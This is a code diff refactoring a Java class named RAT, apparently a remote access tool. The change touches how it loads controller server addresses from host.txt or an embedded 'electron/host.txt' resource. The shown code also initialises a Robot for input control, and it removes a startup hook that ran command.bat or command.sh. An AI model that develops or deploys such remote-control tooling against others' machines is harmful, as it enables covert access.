@@ -34,6 +34,7 @@ public class RAT {
 		} else {
 			isNativeImage = false;
 		}
+		// Showing system data
 		logger.log("[RAT.main]: ---------------------------");
 		logger.log("[RAT.main]: Installation data:");
 		logger.log("[RAT.main]: OS: " + os);
@@ -42,17 +43,7 @@ public class RAT {
 		// Loading network configuration
 		logger.log("[RAT.main]: loading network data...");
 		File host = new File("host.txt");
-		List<String> servers;
-		if (host.exists() == false) {
-			if (isNativeImage) {
-				logger.error("[RAT.main]: can't find external network config file for native-image executable.");
-				logger.log("[RAT.main]: Bye.");
-				return;
-			}
-			servers = loadConnectionData(true, host);
-		} else {
-			servers = loadConnectionData(false, host);
-		}
+		List<String> servers = loadConnectionData(host);
 		logger.log("[RAT.main]: Success.");
 		// Initializing Robot
 		logger.log("[RAT.main]: ---------------------------");
@@ -67,18 +58,6 @@ public class RAT {
 		} catch (AWTException e) {
 			logger.error("[RAT.main]: error initializing robot: " + e.getMessage());
 		}
-		logger.log("[RAT.main]: ---------------------------");
-		/*
-		 * You can launch your script with this app startup. (For example you can create
-		 * crash handler)
-		 */
-		logger.log("[RAT.main]: Launching external command file...");
-		if (cmd.isWindows) {
-			cmd.run("command.bat");
-		} else {
-			cmd.run("sh command.sh");
-		}
-		logger.log("[RAT.main]: Done.");
 		logger.log("[RAT.main]: ---------------------------");
 		logger.log("[RAT.main]: Loaded.");
 		// Keeping connection thread working
@@ -96,13 +75,13 @@ public class RAT {
 	}
 
 	/**
-	 * @param isInternalFile
-	 * @param host
+	 * @param File host
 	 * @return List<String> servers
 	 * @throws IOException
 	 */
-	private static List<String> loadConnectionData(boolean isInternalFile, File host) throws IOException {
+	private static List<String> loadConnectionData(File host) throws IOException {
 		List<String> servers = new ArrayList<String>();
+		boolean isInternalFile = getConnectionFileType(host);
 		if (isInternalFile) {
 			InputStream in = RAT.class.getClassLoader().getResourceAsStream("electron/host.txt");
 			String filedata = FileOptions.getInternalFileLineWithSeparator(in, "SPLITTER");
@@ -121,5 +100,18 @@ public class RAT {
 		}
 		logger.log("[RAT.loadConnectionData]: loaded " + servers.size() + " servers.");
 		return servers;
+	}
+
+	private static boolean getConnectionFileType(File host) {
+		if (host.exists() == false) {
+			if (isNativeImage) {
+				logger.error("[RAT]: can't find external network config file for native-image executable.");
+				logger.log("[RAT]: Bye.");
+				System.exit(1);
+			}
+			return true;
+		} else {
+			return false;
+		}
 	}
 }
